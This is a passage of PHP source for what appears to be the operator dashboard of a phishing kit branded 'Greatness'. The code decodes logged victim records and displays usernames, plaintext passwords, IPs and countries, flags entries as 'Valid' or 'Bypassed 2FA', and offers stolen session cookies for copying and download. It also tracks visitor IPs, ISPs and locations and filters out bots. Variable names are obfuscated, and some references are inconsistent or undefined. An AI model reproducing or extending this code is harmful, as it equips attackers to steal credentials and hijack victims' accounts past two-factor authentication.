echo "\t\t\t\t\t</tbody>\r\n\t\t\t\t\t</table>\r\n                </div>\r\n              </div>\r\n            </div>\r\n          </div>\r\n          <div class=\"row\">\r\n            <div class=\"col-md-12 col-lg-12 col-sm-12 col-xs-12\">\r\n              <div class=\"white-box overflow-auto\">\r\n                <h3 class=\"box-title\">Results</h3>\r\n                <div class=\"d-md-flex\">\r\n                  <ul class=\"list-inline d-flex ms-auto\">\r\n\t\t\t\t   <form role=\"search\" class=\"app-search d-none d-md-block me-3\">\r\n                  <input\r\n                    type=\"text\"\r\n                    placeholder=\"Search...\"\r\n                    class=\"form-control mt-0 live-search\"\r\n                  />\r\n                </form>\r\n\t\t\t\t  </ul>\r\n                </div>\r\n                <div class=\"modal\" id=\"exampleModalCenter\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"exampleModalCenterTitle\" aria-hidden=\"true\">\r\n                  <div class=\"modal-dialog modal-dialog-centered\" role=\"document\">\r\n                    <div class=\"modal-content\">\r\n                      <div class=\"modal-header\">\r\n                        <h5 class=\"modal-title\" id=\"exampleModalLongTitle\">{header}</h5>\r\n                        <button type=\"button\" class=\"btn btn-secondary close-modal\" data-dismiss=\"modal\" aria-label=\"Close\">\r\n                          <span aria-hidden=\"true\">&times;</span>\r\n                        </button>\r\n                      </div>\r\n                      <div style=\"height: 10rem; max-height: 16rem;\" class=\"modal-body overflow-auto\">\r\n                        {content}\r\n                      </div>\r\n                      <div class=\"modal-footer\">\r\n                        <input type=\"hidden\" class=\"d-def\"></input>\r\n                        <button type=\"button\" class=\"btn btn-secondary close-modal\" data-dismiss=\"modal\">Close</button>\r\n                        <button type=\"button\" class=\"btn btn-primary download\">Download <i class=\"fa fa-download\"></i></button>\r\n                        <button type=\"button\" class=\"btn btn-primary copy\">Copy <i class=\"fa fa-clipboard\"></i></button>\r\n                      </div>\r\n                    </div>\r\n                  </div>\r\n                </div>\r\n                <div id=\"ctx-visits\" style=\"max-height: 405px;\">\r\n                 \r\n                 <table class=\"d-tab\">\r\n\t\t\t\t\t<tbody>\r\n                   ";
if (file_exists("logs.json")) {
    function Strainer($marauding)
    {
        $good = explode(PHP_EOL, file_get_contents("log.json"));
        foreach ($good as $music => $december) {
            if ($december) {
                $sulfate = json_decode($december, 1);
                $stabilize = $sulfate["ip"];
                if ($stabilize == $marauding) {
                    return $sulfate["country"];
                }
            } else {
            }
        }
    }
    $blue_eyed_pleco = function ($stitch) {
        if (!$stitch) {
            return;
        }
        $stitch = $starlet = json_decode($stitch, 1);
        $fanatic = $starlet["type"];
        switch ($fanatic) {
            case 0:
                $rocker = "Invalid";
                break;
            case 1:
                $rocker = "Valid";
                break;
            case 2:
                $rocker = "Bypassed 2FA";
                break;
            case 3:
                $rocker = "Bypassed 2FA";
                break;
            default:
                $rocker = "Un";
                break;
        }
        $landless = explode(".", explode("@", $stitch["user"])[1])[0];
        $lace_monitor = preg_replace("/" . $landless . "/", str_repeat("*", strlen($landless)), $stitch["user"]);
        $mocha = $stitch["ip"];
        $rubdown = Troglodytarum();
        $beagle_shepherd = array("type" => "log_for_" . $mocha, "val" => base64_encode(sprintf("========%s Log ========<br>   Username  =  %s<br>  Password  =  %s<br>  IP = %s   %s <br>============Greatness============\r\n\t\t\t\t\t\t\t", $rocker, $stitch["user"], $stitch["pass"], $mocha, $fanatic == 0 ? "<br>Type  =  " . $stitch["method"] : '')), "head" => $rocker . " Log for " . $mocha . " on " . $stitch["date"]);
        $bagworm_moth = array("type" => "cookie_for_" . $mocha, "val" => sprintf("%s", $fanatic >= 2 ? '' . $stitch["cook"] : ''), "head" => $rocker . " Cookie for " . $mocha . " on " . $stitch["date"]);
        $remark = sprintf("<tr class=\"full-width-tr\"><td class=\"full-width-td\"><div class=\"row\"><div class=\"col\">\r\n                      <div class=\"card shadow\">\r\n                        <h5 class=\"card-header\">%s Log</h5>\r\n                        <div class=\"card-body\">\r\n                          <div class=\"card-title row\"><div class=\"col-2\"><h5>%s</h5></div> <div class=\"col\" ><div style=\"text-align:center; background-color: rgb(181, 188, 219,0.5); max-width: 180px;\";><h5>%s</h5></div></div> </div>\r\n                          <div class=\"card-text position-relative row\">\r\n                            <div class=\"col-6 mx-4 hidden-em\">\r\n                              %s\r\n                            </div>\r\n                            <div class=\"col-2\">\r\n                              <button class=\"btn btn-primary show-log\" value='%s'>\r\n                                Details\r\n                                <i class=\"fa fa-eye\"></i>\r\n                              </button>\r\n                            </div>\r\n                            <div class=\"col-3\">\r\n                              <button class=\"btn btn-primary show-cook\" value='%s' %s>\r\n                                Cookies\r\n                                <i class=\"fa fa-eye\"></i>\r\n                              </button>\r\n                            </div>\r\n                          </div>\r\n                        </div>\r\n                      </div>\r\n\t\t\t\t\t   </div></div></td></tr>", $rocker, $mocha, Strainer($mocha), $lace_monitor, json_encode($beagle_shepherd), $fanatic >= 2 ? json_encode($bagworm_moth) : '', $fanatic < 2 ? "disabled" : '');
        echo $remark;
    };
    foreach (array_reverse($tingle) as $salvaging => $brim) {
        $blue_eyed_pleco(base64_decode($brim));
    }
} else {
    echo "Nothing Yet";
}
echo "\t\t\t\t   \r\n\r\n                 \r\n\r\n                  \r\n\r\n\t\t\t\t\t</tbody>\r\n\t\t\t\t\t</table>\r\n                </div>\r\n              </div>\r\n            </div>\r\n          </div>\r\n          <!-- ============================================================== -->\r\n          <!-- RECENT SALES -->\r\n          <!-- ============================================================== -->\r\n          <div class=\"row\">\r\n            <div class=\"col-md-12 col-lg-12 col-sm-12\">\r\n              <div class=\"white-box overflow-auto\" style=\"max-height: 30rem;\">\r\n                <div class=\"d-md-flex mb-3\">\r\n                  <h3 class=\"box-title mb-0\">Recent Visit</h3>\r\n                  <div class=\"col-md-3 col-sm-4 col-xs-6 ms-auto\">\r\n                  </div>\r\n                </div>\r\n                <div class=\"table-responsive\">\r\n                  <table class=\"table no-wrap\">\r\n                    <thead>\r\n                      <tr>\r\n                        <th class=\"border-top-0\">#</th>\r\n                        <th class=\"border-top-0\">IP</th>\r\n                        <th class=\"border-top-0\">Status</th>\r\n                        <th class=\"border-top-0\">ISP</th>\r\n                        <th class=\"border-top-0\">Date</th>\r\n                        <th class=\"border-top-0\">City</th>\r\n                        <th class=\"border-top-0\">Country</th>\r\n                      </tr>\r\n                    </thead>\r\n                    <tbody>\r\n\t\t\t\t\t";
if (file_exists("log.json")) {
    function Overview($stonework, $stitch)
    {
        $umpire = json_decode($stitch, 1);
        printf("\r\n                      <tr>\r\n                        <td>%s</td>\r\n                        <td class=\"txt-oflo\">%s</td>\r\n                        <td>%s</td>\r\n                        <td class=\"txt-oflo\">%s</td>\r\n                        <td class=\"txt-oflo\">%s</td>\r\n                        <td class=\"txt-oflo\"><span class=\"text-success\">%s</span></td>\r\n                        <td><span class=\"text-success\">%s</span></td>\r\n                      </tr>", $stonework, $umpire["ip"], $umpire["bot"] == 0 ? "Visitor" : "Bot", $umpire["isp"], $umpire["date"], $umpire["city"], $umpire["country"]);
    }
    $good = explode(PHP_EOL, file_get_contents("log.json"));
    $good = array_filter(array_reverse($good), "strlen");
    foreach ($good as $music => $december) {
        $muskox = json_decode($december, 1)["bot"];
        if ($muskox == 0) {
            Overview(count($good) + 1 - $music, $december);
        }
    }
}
echo "                      \r\n                    </tbody>\r\n                  </table>\r\n                </div>\r\n              </div>\r\n            </div>\r\n          </div>\r\n          <!-- ============================================================== -->\r\n          <!-- Recent Comments -->\r\n          <!-- ============================================================== -->\r\n          \r\n        </div>\r\n        <!-- ============================================================== -->\r\n        <!-- End Container fluid  -->\r\n        <!-- ============================================================== -->\r\n        <!-- ============================================================== -->\r\n        <!-- footer -->\r\n        <!-- ============================================================== -->\r\n        <footer class=\"footer text-center\">\r\n          Greatness\r\n        </footer>\r\n        <!-- ============================================================== -->\r\n        <!-- End footer -->\r\n        <!-- ============================================================== -->\r\n      </div>\r\n      <!-- ============================================================== -->\r\n      <!-- End Page wrapper  -->\r\n      <!-- ============================================================== -->\r\n    </div>\r\n    <!-- ============================================================== -->\r\n    <!-- End Wrapper -->\r\n    <!-- ============================================================== -->\r\n    <!-- ============================================================== -->\r\n    <!-- All Jquery -->\r\n    <!-- ============================================================== -->\r\n\r\n    <script src=\"https://demos.wrappixel.com/free-admin-templates/bootstrap/ample-bootstrap-free/html/plugins/bower_components/jquery/dist/jquery.min.js\"></script>\r\n    <!-- Bootstrap tether Core JavaScript -->\r\n    <script src=\"https://demos.wrappixel.com/free-admin-templates/bootstrap/ample-bootstrap-free/html/bootstrap/dist/js/bootstrap.bundle.min.js\"></script>\r\n    <script src=\"https://demos.wrappixel.com/free-admin-templates/bootstrap/ample-bootstrap-free/html/js/app-style-switcher.js\"></script>\r\n    <script src=\"https://demos.wrappixel.com/free-admin-templates/bootstrap/ample-bootstrap-free/html/plugins/bower_components/jquery-sparkline/jquery.sparkline.min.js\"></script>\r\n    <!--Wave Effects -->\r\n    <script src=\"https://demos.wrappixel.com/free-admin-templates/bootstrap/ample-bootstrap-free/html/js/waves.js\"></script>\r\n    <!--Menu sidebar -->\r\n    <script src=\"https://demos.wrappixel.com/free-admin-templates/bootstrap/ample-bootstrap-free/html/js/sidebarmenu.js\"></script>\r\n    <!--Custom JavaScript -->\r\n    <script src=\"js/custom.js\"></script>\r\n    <!--This page JavaScript -->\r\n    <!--chartis chart-->\r\n    <script src=\"https://demos.wrappixel.com/free-admin-templates/bootstrap/ample-bootstrap-free/html/plugins/bower_components/chartist/dist/chartist.min.js\"></script>\r\n    <script src=\"https://demos.wrappixel.com/free-admin-templates/bootstrap/ample-bootstrap-free/html/plugins/bower_components/chartist-plugin-tooltips/dist/chartist-plugin-tooltip.min.js\"></script>\r\n    <script src=\"https://demos.wrappixel.com/free-admin-templates/bootstrap/ample-bootstrap-free/html/js/pages/dashboards/dashboard1.js\"></script>\r\n  </body>\r\n</html>";
